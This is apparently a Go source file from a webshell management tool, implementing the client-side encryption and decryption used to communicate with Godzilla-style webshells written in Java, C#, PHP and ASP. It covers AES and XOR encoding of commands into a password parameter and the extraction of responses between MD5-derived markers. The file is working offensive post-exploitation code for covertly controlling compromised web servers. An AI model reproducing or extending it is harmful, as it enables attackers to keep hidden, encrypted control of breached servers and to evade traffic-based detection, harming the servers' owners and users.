package godzilla

import (
	"encoding/base64"
	"fmt"
	"github.com/Go0p/wsm/lib/encrypt"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/utils"
	"log"
	"net/url"
	"regexp"
)

func Encrypto(content, key []byte, pass string, cryption CrypticType, script shell.ScriptType) []byte {
	var result []byte
	if script == shell.JavaScript {
		if cryption == JAVA_AES_BASE64 {
			//key =
			result = []byte(pass + "=" + url.QueryEscape(base64.StdEncoding.EncodeToString(encryptForJava(content, key))))
		} else if cryption == JAVA_AES_RAW {
			result = encryptForJava(content, key)
		} else {
			log.Println("encryption mode err")
		}
	} else if script == shell.CsharpScript {
		if cryption == CSHARP_AES_BASE64 {
			result = []byte(pass + "=" + url.QueryEscape(base64.StdEncoding.EncodeToString(encryptForCSharp(content, key))))
		} else if cryption == CSHARP_AES_RAW {
			result = encryptForCSharp(content, key)
		} else {
			log.Println("encryption mode err")
		}
	} else if script == shell.PhpScript {
		if cryption == PHP_XOR_BASE64 {
			result = []byte(pass + "=" + url.QueryEscape(base64.StdEncoding.EncodeToString(encrypt.Xor(content, key))))
		} else if cryption == PHP_XOR_RAW {
			result = encrypt.Xor(content, key)
		} else {
			log.Println("encryption mode err")
		}
	} else if script == shell.AspScript {
		if cryption == ASP_XOR_BASE64 {
			result = []byte(pass + "=" + url.QueryEscape(base64.StdEncoding.EncodeToString(encrypt.Xor(content, key))))
		} else if cryption == ASP_XOR_RAW {
			result = encrypt.Xor(content, key)
		} else {
			log.Println("encryption mode err")
		}
	} else {
		panic("script error " + script)
	}

	return result
}

func Decrypto(content, key []byte, pass string, cryption CrypticType, script shell.ScriptType) []byte {
	var result []byte
	if script == shell.JavaScript {
		if cryption == JAVA_AES_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, _ = base64.StdEncoding.DecodeString(cont[1])
				result = decryptForJava(result, key)
			}
		} else if cryption == JAVA_AES_RAW {
			result = decryptForJava(content, key)
		} else {
			log.Println("decryption mode err")
		}
	} else if script == shell.CsharpScript {
		if cryption == CSHARP_AES_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, _ = base64.StdEncoding.DecodeString(cont[1])
				result = decryptForCSharp(result, key)
			}
		} else if cryption == CSHARP_AES_RAW {
			result = decryptForCSharp(content, key)
		} else {
			log.Println("decryption mode err")
		}
	} else if script == shell.PhpScript {
		if cryption == PHP_XOR_BASE64 {
			flag := utils.MD5(pass + string(key))
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:16] + `(.*?)` + flag[16:]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, _ = base64.StdEncoding.DecodeString(cont[1])
				result = encrypt.Xor(result, key)
			}
		} else if cryption == PHP_XOR_RAW {
			result = encrypt.Xor(content, key)
		} else {
			log.Println("decryption mode err")
		}
	} else if script == shell.AspScript {
		if cryption == ASP_XOR_BASE64 {
			flag := utils.MD5(pass + string(key))
			// ASP_XOR_BASE64 取的是前 6 后 6
			cont := regexp.MustCompile(`(?s)(?i)` + flag[0:6] + `(.*?)` + flag[20:26]).FindStringSubmatch(string(content))
			if len(cont) == 2 {
				result, _ = base64.StdEncoding.DecodeString(cont[1])
				result = encrypt.Xor(result, key)
			}
		} else if cryption == ASP_XOR_RAW {
			result = encrypt.Xor(content, key)
		} else {
			log.Println("decryption mode err")
		}
	} else {
		panic("script error " + script)
	}

	return result
}

func encryptForCSharp(content, key []byte) []byte {
	encrypted, err := encrypt.AESCBCEncrypt(content, key, key)
	if err != nil {
		fmt.Println(err)
	}
	return encrypted

}

func decryptForCSharp(content []byte, key []byte) []byte {
	decrypted, _ := encrypt.AESCBCDecrypt(content, key, key)
	return decrypted
}

func encryptForJava(content, key []byte) []byte {
	encrypted, _ := encrypt.AESECBEncrypt(content, key)
	return encrypted
}

func decryptForJava(content, key []byte) []byte {
	decrypted, _ := encrypt.AESECBDecrypt(content, key)
	return decrypted
}
